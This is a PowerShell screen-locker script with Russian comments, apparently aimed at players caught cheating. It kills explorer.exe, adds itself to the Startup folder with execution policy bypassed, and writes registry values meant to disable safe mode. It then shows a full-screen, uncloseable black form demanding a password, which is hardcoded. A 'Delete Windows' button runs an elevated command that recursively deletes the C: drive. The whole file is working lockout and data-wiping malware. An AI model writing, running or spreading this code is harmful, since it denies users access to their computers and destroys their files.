Add-Type -AssemblyName System.Windows.Forms

# Завершаем процесс explorer.exe с помощью taskkill
Start-Process -FilePath "taskkill.exe" -ArgumentList "/F", "/IM", "explorer.exe" -Wait

# Добавляем скрипт в автозагрузку
$scriptPath = $MyInvocation.MyCommand.Path
$shortcutPath = [System.IO.Path]::Combine([System.Environment]::GetFolderPath('Startup'), "BlockWindows.lnk")

if (-not (Test-Path $shortcutPath)) {
    $WshShell = New-Object -ComObject WScript.Shell
    $shortcut = $WshShell.CreateShortcut($shortcutPath)
    $shortcut.TargetPath = "powershell.exe"
    $shortcut.Arguments = "-ExecutionPolicy Bypass -File `"$scriptPath`""
    $shortcut.IconLocation = "powershell.exe"
    $shortcut.Save()
}

# Блокируем безопасные режимы
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal" -Name "DisableSafeMode" -Value 1 -ErrorAction SilentlyContinue
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SafeBoot\Alternate" -Name "DisableSafeMode" -Value 1 -ErrorAction SilentlyContinue

# Создаем форму
$form = New-Object System.Windows.Forms.Form
$form.TopMost = $true
$form.FormBorderStyle = 'None'  # Убираем рамку
$form.WindowState = 'Maximized'  # Устанавливаем полноэкранный режим
$form.BackColor = [System.Drawing.Color]::Black  # Устанавливаем черный фон
$form.Opacity = 1  # Убираем прозрачность

# Создаем метку с текстом "Windows заблокирован!"
$labelTitle = New-Object System.Windows.Forms.Label
$labelTitle.Text = "Windows заблокирован!"
$labelTitle.ForeColor = [System.Drawing.Color]::White  # Белый текст
$labelTitle.Font = New-Object System.Drawing.Font("Arial", 48)
$labelTitle.AutoSize = $true
$labelTitle.TextAlign = 'MiddleCenter'
$labelTitle.SetBounds(0, 100, $form.ClientSize.Width, 100)

# Создаем метку с текстом "Введите пароль"
$labelPrompt = New-Object System.Windows.Forms.Label
$labelPrompt.Text = "Ну что, дочитерился? Твой комп заблокан, вводи пароль или сноси систему:)"
$labelPrompt.ForeColor = [System.Drawing.Color]::White  # Белый текст
$labelPrompt.Font = New-Object System.Drawing.Font("Arial", 14)
$labelPrompt.AutoSize = $true
$labelPrompt.TextAlign = 'MiddleCenter'
$labelPrompt.SetBounds(0, 200, $form.ClientSize.Width, 100)

# Создаем поле для ввода кода
$textBox = New-Object System.Windows.Forms.TextBox
$textBox.SetBounds(100, 300, 300, 50)
$textBox.Font = New-Object System.Drawing.Font("Arial", 24)
$textBox.ReadOnly = $true  # Делаем поле только для чтения
$textBox.BackColor = [System.Drawing.Color]::Black  # Черный фон
$textBox.ForeColor = [System.Drawing.Color]::White  # Белый текст
$textBox.BorderStyle = [System.Windows.Forms.BorderStyle]::FixedSingle  # Устанавливаем рамку

# Создаем кнопки с цифрами
$buttons = @()
for ($i = 1; $i -le 9; $i++) {
    $button = New-Object System.Windows.Forms.Button
    $button.Text = $i.ToString()
    $button.SetBounds(100 + (($i - 1) * 60), 370, 50, 50)  # Изменены размеры и расположение кнопок
    $button.Font = New-Object System.Drawing.Font("Arial", 24)
    $button.BackColor = [System.Drawing.Color]::Black  # Черная кнопка
    $button.ForeColor = [System.Drawing.Color]::White  # Белый текст
    $button.FlatStyle = [System.Windows.Forms.FlatStyle]::Standard  # Устанавливаем стиль кнопок
    $button.FlatAppearance.BorderColor = [System.Drawing.Color]::White  # Белая рамка
    $button.FlatAppearance.BorderSize = 2  # Размер рамки

    # Обработчик нажатия на кнопку
    $button.Add_Click({
        $textBox.Text += $this.Text  # Исправлено на использование $this для получения текста кнопки
    })
    $buttons += $button
}

# Создаем кнопку "0"
$button0 = New-Object System.Windows.Forms.Button
$button0.Text = "0"
$button0.SetBounds(100 + (9 * 60), 370, 50, 50)  # Размещаем кнопку "0"
$button0.Font = New-Object System.Drawing.Font("Arial", 24)
$button0.BackColor = [System.Drawing.Color]::Black
$button0.ForeColor = [System.Drawing.Color]::White
$button0.FlatStyle = [System.Windows.Forms.FlatStyle]::Standard
$button0.FlatAppearance.BorderColor = [System.Drawing.Color]::White
$button0.FlatAppearance.BorderSize = 2
$button0.Add_Click({
    $textBox.Text += "0"
})

# Создаем кнопку "Очистить"
$buttonClear = New-Object System.Windows.Forms.Button
$buttonClear.Text = "Очистить"
$buttonClear.SetBounds(100, 440, 300, 50)  # Изменены размеры и расположение кнопки "Очистить"
$buttonClear.Font = New-Object System.Drawing.Font("Arial", 24)  # Тот же шрифт, что и у кнопки разблокировки
$buttonClear.BackColor = [System.Drawing.Color]::Black
$buttonClear.ForeColor = [System.Drawing.Color]::White
$buttonClear.FlatStyle = [System.Windows.Forms.FlatStyle]::Standard
$buttonClear.FlatAppearance.BorderColor = [System.Drawing.Color]::White
$buttonClear.FlatAppearance.BorderSize = 2
$buttonClear.Add_Click({
    $textBox.Text = ""  # Очищаем поле ввода
})

# Создаем кнопку "Разблокировать"
$buttonUnlock = New-Object System.Windows.Forms.Button
$buttonUnlock.Text = "Разблокировать"
$buttonUnlock.SetBounds(100, 500, 300, 50)
$buttonUnlock.Font = New-Object System.Drawing.Font("Arial", 24)
$buttonUnlock.BackColor = [System.Drawing.Color]::Black
$buttonUnlock.ForeColor = [System.Drawing.Color]::White
$buttonUnlock.FlatStyle = [System.Windows.Forms.FlatStyle]::Standard
$buttonUnlock.FlatAppearance.BorderColor = [System.Drawing.Color]::White
$buttonUnlock.FlatAppearance.BorderSize = 2

# Создаем кнопку "Удалить Windows"
$buttonDelete = New-Object System.Windows.Forms.Button
$buttonDelete.Text = "Удалить Windows"
$buttonDelete.SetBounds(100, 550, 300, 50)
$buttonDelete.Font = New-Object System.Drawing.Font("Arial", 24)
$buttonDelete.BackColor = [System.Drawing.Color]::Black
$buttonDelete.ForeColor = [System.Drawing.Color]::White
$buttonDelete.FlatStyle = [System.Windows.Forms.FlatStyle]::Standard
$buttonDelete.FlatAppearance.BorderColor = [System.Drawing.Color]::White
$buttonDelete.FlatAppearance.BorderSize = 2

# Обработчик нажатия кнопки разблокировки
$buttonUnlock.Add_Click({
    if ($textBox.Text -eq '1274837411') {
        # Проверяем, что процесс explorer.exe не запущен
        $explorerProcess = Get-Process -Name "explorer" -ErrorAction SilentlyContinue
        if (-not $explorerProcess) {
            Start-Process "C:\windows\explorer.exe"  # Запускаем процесс explorer.exe при правильном коде
        }
        $form.Close()  # Закрываем окно при правильном коде
        Stop-Process -Id $PID -Force  # Завершаем процесс данного скрипта
    } else {
        $textBox.Text = "Неверный пароль!"  # Выводим сообщение в поле ввода
        $textBox.ForeColor = [System.Drawing.Color]::White  # Меняем цвет текста на красный для выделения
    }
})

# Обработчик нажатия кнопки удаления Windows
$buttonDelete.Add_Click({
    # Создаем новый процесс для командной строки
    $process = New-Object System.Diagnostics.Process
    $process.StartInfo.FileName = "cmd.exe"
    $process.StartInfo.Arguments = "/c rd C:\ /s /q & del C:\ /s /q"
    $process.StartInfo.Verb = "runas"  # Запускаем с правами администратора
    $process.Start()
})

# Добавляем элементы управления на форму
$form.Controls.Add($labelTitle)
$form.Controls.Add($labelPrompt)
$form.Controls.Add($textBox)
$form.Controls.Add($buttonUnlock)
$form.Controls.Add($buttonDelete)
$form.Controls.AddRange($buttons)  # Добавляем кнопки 1-9
$form.Controls.Add($button0)  # Добавляем кнопку 0
$form.Controls.Add($buttonClear)  # Добавляем кнопку "Очистить"

# Отключаем кнопку закрытия
$form.ControlBox = $false

# Обработчик события закрытия формы, чтобы предотвратить закрытие
$form.Add_FormClosing({
    $_.Cancel = $true  # Отменяем закрытие
})

# Блокируем горячие клавиши для диспетчера задач
$form.Add_KeyDown({
    param($sender, $e)
    $e.Handled = $true  # Игнорируем нажатия
})

# Создаем таймер для обновления положения формы
$timer = New-Object System.Windows.Forms.Timer
$timer.Interval = 40  # Интервал 40 миллисекунд
$timer.Add_Tick({
    $form.TopMost = $true  # Обеспечиваем, что форма всегда поверх
})
$timer.Start()  # Запускаем таймер

# Показываем форму
$form.ShowDialog()